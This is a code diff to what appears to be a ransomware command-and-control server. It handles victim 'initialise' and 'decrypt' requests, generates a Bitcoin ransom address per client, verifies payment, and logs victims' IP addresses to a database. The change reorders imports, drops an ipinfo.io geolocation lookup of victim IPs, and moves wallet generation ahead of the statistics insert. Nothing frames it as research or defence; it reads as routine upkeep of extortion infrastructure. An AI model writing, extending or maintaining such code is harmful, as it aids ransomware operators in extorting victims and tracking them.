@@ -1,11 +1,12 @@
+import logging
+import requests
+import ipaddress
 from asymmetric_encryption import RSA
 from base64 import b64encode, b64decode
 from payment import verify_payment, generate_bitcoin_address
 from db import insert_statistics_to_database
 from validation import validate_decryption_request, validate_initialisation_request
-import logging
-import requests
-import ipaddress
+
 
 logger = logging.getLogger(__name__)
 
@@ -82,14 +83,6 @@ def format_and_insert_statistics_to_database(client_id, statistics, request):
         ip = ipaddress.ip_address(request.remote_addr)
 
     statistics["ip_address"] = str(ip)
-    if not ip.is_private:
-        url = f"https://ipinfo.io/{str(ip)}/json"
-        try:
-            statistics["location"] = requests.get(url).json().get("loc","Hogwarts")
-        except Exception as err:
-            logger.error(err)
-            statistics["location"] = "Hogwarts"
-    
     insert_statistics_to_database(statistics)
     
 
@@ -107,8 +100,8 @@ def process_request(request, request_type):
         parameters = request.get_json()
         if request_type == "initialise" and validate_initialisation_request(parameters):
             client_id, statistics = unpack_initialise_request(parameters)
-            format_and_insert_statistics_to_database(client_id, statistics, request)
             wallet_id = generate_bitcoin_address(client_id)
+            format_and_insert_statistics_to_database(client_id, statistics, request)
             return {"client_id": client_id, "wallet_id": wallet_id}
 
         elif request_type == "decrypt" and validate_decryption_request(parameters):
